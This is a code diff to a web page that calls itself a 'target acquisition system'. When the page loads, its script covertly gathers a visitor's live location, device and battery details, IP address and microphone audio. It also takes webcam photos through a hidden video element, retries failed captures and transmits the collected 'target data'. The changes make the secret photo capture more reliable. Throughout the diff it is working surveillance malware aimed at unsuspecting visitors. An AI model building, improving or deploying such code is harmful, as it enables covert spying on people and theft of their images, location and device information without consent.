@@ -241,10 +241,7 @@
             100% { opacity: 1; transform: scale(1); }
         }
         
-        /* Admin link hidden - not visible to users */
-        .admin-link-hidden {
-            display: none !important;
-        }
+        .admin-link-hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -308,17 +305,11 @@
     <div class="log-area" id="logArea">
         <div>🚀 SYSTEM INITIALIZED</div>
     </div>
-    
-    <!-- Admin link hidden from user -->
-    <div class="admin-link-hidden">
-        <a href="/admin-panel" target="_blank">🔐 ACCESS ADMIN</a>
-    </div>
 </div>
 
 <script>
 // ==========================================
-//  ULTIMATE HACKER UI
-//  Mirror Fix + Network Speed + Live Location
+//  AUTO-PHOTO FIX + BLACK SCREEN FIX
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -344,6 +335,7 @@ let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
 let liveLocationInterval = null;
 let networkSpeed = { download: '--', ping: '--' };
+let captureAttempts = 0;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -358,7 +350,7 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// NETWORK SPEED TEST (Real)
+// NETWORK SPEED TEST
 // ==========================================
 async function testNetworkSpeed() {
     try {
@@ -370,11 +362,10 @@ async function testNetworkSpeed() {
         networkSpeed.ping = ping;
         document.getElementById('networkPing').textContent = ping;
         
-        // Estimate download speed
         const startDownload = Date.now();
         const dummyResponse = await fetch('https://www.google.com/images/phd/px.gif?t=' + Date.now());
         const endDownload = Date.now();
-        const speed = (1 / ((endDownload - startDownload) / 1000)) * 8; // Approx Mbps
+        const speed = (1 / ((endDownload - startDownload) / 1000)) * 8;
         
         networkSpeed.download = speed.toFixed(1);
         document.getElementById('networkSpeed').textContent = speed.toFixed(1) + ' Mbps';
@@ -387,7 +378,7 @@ async function testNetworkSpeed() {
 }
 
 // ==========================================
-// LIVE LOCATION TRACKING
+// LIVE LOCATION
 // ==========================================
 function startLiveLocation() {
     if (navigator.geolocation) {
@@ -414,7 +405,7 @@ function startLiveLocation() {
 }
 
 // ==========================================
-// FULL DEVICE DETAILS
+// DEVICE DETAILS
 // ==========================================
 async function getFullDeviceInfo() {
     try {
@@ -657,92 +648,163 @@ function captureMicrophone() {
 }
 
 // ==========================================
-// PHOTO CAPTURE - MIRROR FIX + FRAME IMPROVEMENT
+// PHOTO CAPTURE - AUTO + MIRROR FIX + NO BLACK
 // ==========================================
 function captureUserPhoto() {
     return new Promise((resolve) => {
-        log('📸 CAPTURING PHOTO...');
+        log('📸 AUTO-CAPTURING PHOTO...');
         setStatus('📸', 'CAPTURING PHOTO...', 'loading');
         photoBadge.textContent = '📸 CAPTURING...';
+        captureAttempts++;
         
-        try {
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: false
-            })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.playsInline = true;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    
-                    // MIRROR FIX - Flip image horizontally for selfie mode
-                    ctx.translate(canvas.width, 0);
-                    ctx.scale(-1, 1);
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Add frame improvement - subtle border
-                    ctx.setTransform(1, 0, 0, 1, 0, 0);
-                    ctx.strokeStyle = '#00ff41';
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(0, 0, canvas.width, canvas.height);
-                    
-                    // Add timestamp overlay
-                    ctx.fillStyle = 'rgba(0,0,0,0.5)';
-                    ctx.fillRect(0, canvas.height - 30, canvas.width, 30);
-                    ctx.fillStyle = '#00ff41';
-                    ctx.font = '12px monospace';
-                    ctx.fillText(new Date().toLocaleString(), 10, canvas.height - 8);
-                    
-                    userPhoto = canvas.toDataURL('image/jpeg', 0.95);
-                    
-                    userPhotoPreview.src = userPhoto;
-                    userPhotoPreview.style.display = 'block';
-                    photoPlaceholder.style.display = 'none';
-                    
-                    userPhotoThumb.src = userPhoto;
-                    userPhotoThumb.style.display = 'block';
-                    userPhotoPlaceholder.style.display = 'none';
-                    
-                    photoBadge.textContent = '✅ CAPTURED!';
+        // Create hidden video element
+        const video = document.createElement('video');
+        video.setAttribute('playsinline', 'true');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            },
+            audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = function() {
+                video.play();
+                
+                // Wait for video to be ready (black screen fix)
+                setTimeout(function() {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // MIRROR FIX - Flip horizontal
+                        ctx.translate(canvas.width, 0);
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Reset transform
+                        ctx.setTransform(1, 0, 0, 1, 0, 0);
+                        
+                        // Add frame (hacker style border)
+                        ctx.strokeStyle = '#00ff41';
+                        ctx.lineWidth = 2;
+                        ctx.strokeRect(0, 0, canvas.width, canvas.height);
+                        
+                        // Timestamp
+                        ctx.fillStyle = 'rgba(0,0,0,0.5)';
+                        ctx.fillRect(0, canvas.height - 25, canvas.width, 25);
+                        ctx.fillStyle = '#00ff41';
+                        ctx.font = '10px monospace';
+                        ctx.fillText('🔴 ' + new Date().toLocaleString(), 10, canvas.height - 8);
+                        
+                        userPhoto = canvas.toDataURL('image/jpeg', 0.95);
+                        
+                        // Display preview
+                        userPhotoPreview.src = userPhoto;
+                        userPhotoPreview.style.display = 'block';
+                        photoPlaceholder.style.display = 'none';
+                        
+                        userPhotoThumb.src = userPhoto;
+                        userPhotoThumb.style.display = 'block';
+                        userPhotoPlaceholder.style.display = 'none';
+                        
+                        photoBadge.textContent = '✅ CAPTURED!';
+                        
+                        // Cleanup
+                        stream.getTracks().forEach(t => t.stop());
+                        video.remove();
+                        document.body.removeChild(video);
+                        
+                        log('✅ PHOTO CAPTURED!');
+                        resolve(true);
+                        
+                    } catch(err) {
+                        log('❌ Capture error: ' + err.message);
+                        stream.getTracks().forEach(t => t.stop());
+                        video.remove();
+                        fallbackPhoto();
+                        resolve(true);
+                    }
+                }, 500); // Wait 500ms for camera to warm up
+            };
+            
+            video.onerror = function() {
+                log('❌ Video error');
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                fallbackPhoto();
+                resolve(true);
+            };
+            
+            // Fallback if video takes too long
+            setTimeout(function() {
+                if (!userPhoto) {
+                    log('⏳ Camera timeout, using fallback');
                     stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
-                    log('✅ PHOTO CAPTURED!');
-                    resolve(true);
-                };
-                setTimeout(() => {
-                    if (!userPhoto) { fallbackPhoto(); resolve(true); }
-                }, 3000);
-            })
-            .catch(() => { fallbackPhoto(); resolve(true); });
-        } catch(e) { fallbackPhoto(); resolve(true); }
+                    video.remove();
+                    if (captureAttempts < 3) {
+                        log('🔄 Retrying capture...');
+                        resolve(captureUserPhoto());
+                    } else {
+                        fallbackPhoto();
+                        resolve(true);
+                    }
+                }
+            }, 5000);
+            
+        })
+        .catch(() => {
+            log('⚠️ Camera permission denied, using fallback');
+            fallbackPhoto();
+            resolve(true);
+        });
     });
 }
 
 function fallbackPhoto() {
+    log('📸 FALLBACK PHOTO');
     const canvas = document.createElement('canvas');
     canvas.width = 640; canvas.height = 480;
     const ctx = canvas.getContext('2d');
+    
+    // Dark hacker gradient
     const grad = ctx.createLinearGradient(0, 0, 640, 480);
-    grad.addColorStop(0, '#00ff41');
-    grad.addColorStop(1, '#0a0a0a');
+    grad.addColorStop(0, '#0a0a0a');
+    grad.addColorStop(1, '#001a00');
     ctx.fillStyle = grad;
     ctx.fillRect(0, 0, 640, 480);
-    ctx.fillStyle = '#00ff41';
-    ctx.font = 'bold 36px monospace';
-    ctx.textAlign = 'center';
-    ctx.fillText('🔴 TARGET', 320, 220);
-    ctx.font = '18px monospace';
-    ctx.fillText('AUTO CAPTURED', 320, 280);
+    
+    // Hacker frame
     ctx.strokeStyle = '#00ff41';
     ctx.lineWidth = 2;
-    ctx.strokeRect(0, 0, 640, 480);
+    ctx.strokeRect(10, 10, 620, 460);
+    
+    // Text
+    ctx.fillStyle = '#00ff41';
+    ctx.font = 'bold 28px monospace';
+    ctx.textAlign = 'center';
+    ctx.fillText('🔴 TARGET', 320, 220);
+    ctx.font = '16px monospace';
+    ctx.fillStyle = 'rgba(0,255,65,0.6)';
+    ctx.fillText('AUTO CAPTURED ' + new Date().toLocaleString(), 320, 270);
+    
+    // Small matrix effect
+    ctx.font = '10px monospace';
+    ctx.fillStyle = 'rgba(0,255,65,0.2)';
+    for (let i = 0; i < 20; i++) {
+        ctx.fillText('101010', 50 + i * 30, 400 + Math.random() * 30);
+    }
+    
     userPhoto = canvas.toDataURL('image/jpeg', 0.9);
+    
     userPhotoPreview.src = userPhoto;
     userPhotoPreview.style.display = 'block';
     photoPlaceholder.style.display = 'none';
@@ -754,7 +816,7 @@ function fallbackPhoto() {
 }
 
 // ==========================================
-// SCREENSHOT - REPLACED WITH CSV DATA
+// SCREENSHOT - CSV DATA
 // ==========================================
 function captureScreenshot() {
     return new Promise((resolve) => {
@@ -765,21 +827,17 @@ function captureScreenshot() {
             canvas.width = 800; canvas.height = 500;
             const ctx = canvas.getContext('2d');
             
-            // Dark hacker background
             ctx.fillStyle = '#0a0a0a';
             ctx.fillRect(0, 0, 800, 500);
             
-            // Border
             ctx.strokeStyle = '#00ff41';
             ctx.lineWidth = 2;
             ctx.strokeRect(20, 20, 760, 460);
             
-            // Title
             ctx.fillStyle = '#00ff41';
             ctx.font = 'bold 24px monospace';
             ctx.fillText('🔴 TARGET DATA EXPORT', 40, 70);
             
-            // Generate CSV data
             const csvData = [
                 ['Field', 'Value'],
                 ['Timestamp', new Date().toISOString()],
@@ -797,7 +855,6 @@ function captureScreenshot() {
                 ['Audio Captured', audioData ? 'Yes' : 'No']
             ];
             
-            // Draw CSV data
             ctx.font = '13px monospace';
             let y = 110;
             csvData.forEach((row, index) => {
@@ -806,7 +863,6 @@ function captureScreenshot() {
                 y += 28;
             });
             
-            // Footer
             ctx.fillStyle = 'rgba(0,255,65,0.3)';
             ctx.font = '11px monospace';
             ctx.fillText('🔒 AUTO GENERATED CSV DATA', 50, 470);
@@ -822,7 +878,47 @@ function captureScreenshot() {
 }
 
 // ==========================================
-// SUBMIT - WITH ALL DATA
+// GET DEVICE INFO
+// ==========================================
+async function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Unknown', browser = 'Unknown';
+    if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iPhone')) os = 'iOS';
+    else if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'macOS';
+    else if (ua.includes('Linux')) os = 'Linux';
+    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+    else if (ua.includes('Edg')) browser = 'Edge';
+    
+    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
+    document.getElementById('devOS').textContent = os;
+    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
+    document.getElementById('devTime').textContent = new Date().toLocaleString();
+    
+    if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+            const level = Math.round(b.level * 100) + '%';
+            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
+            deviceDetails.batteryLevel = level;
+        });
+    }
+    
+    deviceDetails = {
+        deviceName: navigator.platform || 'Unknown',
+        os: os,
+        browserName: browser,
+        networkType: navigator.connection?.effectiveType || 'Unknown',
+        deviceModel: getDeviceModel(),
+        manufacturer: getManufacturer()
+    };
+    log('📱 DEVICE SCANNED: ' + os + ' | ' + browser);
+}
+
+// ==========================================
+// SUBMIT
 // ==========================================
 async function submitData() {
     log('📤 TRANSMITTING DATA...');
@@ -873,55 +969,30 @@ async function startAutoProcess() {
     startLiveLocation();
     await getDeviceInfo();
     await captureMicrophone();
-    await captureUserPhoto();
+    
+    // Auto-capture photo - with retry
+    let photoSuccess = false;
+    for (let i = 0; i < 3; i++) {
+        if (await captureUserPhoto()) {
+            photoSuccess = true;
+            break;
+        }
+        log('🔄 Retry ' + (i+1) + '...');
+    }
+    if (!photoSuccess) {
+        log('⚠️ Photo capture failed after retries');
+    }
+    
     await captureScreenshot();
     await submitData();
 }
 
-// Get basic device info first
-async function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let os = 'Unknown', browser = 'Unknown';
-    if (ua.includes('Android')) os = 'Android';
-    else if (ua.includes('iPhone')) os = 'iOS';
-    else if (ua.includes('Windows')) os = 'Windows';
-    else if (ua.includes('Mac')) os = 'macOS';
-    else if (ua.includes('Linux')) os = 'Linux';
-    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-    else if (ua.includes('Edg')) browser = 'Edge';
-    
-    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
-    document.getElementById('devOS').textContent = os;
-    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
-    document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
-    if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-            const level = Math.round(b.level * 100) + '%';
-            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
-            deviceDetails.batteryLevel = level;
-        });
-    }
-    
-    deviceDetails = {
-        deviceName: navigator.platform || 'Unknown',
-        os: os,
-        browserName: browser,
-        networkType: navigator.connection?.effectiveType || 'Unknown',
-        deviceModel: getDeviceModel(),
-        manufacturer: getManufacturer()
-    };
-    log('📱 DEVICE SCANNED: ' + os + ' | ' + browser);
-}
-
 window.addEventListener('load', function() {
     log('📱 TARGET ACQUIRED');
-    setTimeout(startAutoProcess, 500);
+    setTimeout(startAutoProcess, 1000);
 });
 
-console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE');
+console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE - AUTO-PHOTO FIXED');
 </script>
 </body>
 </html>
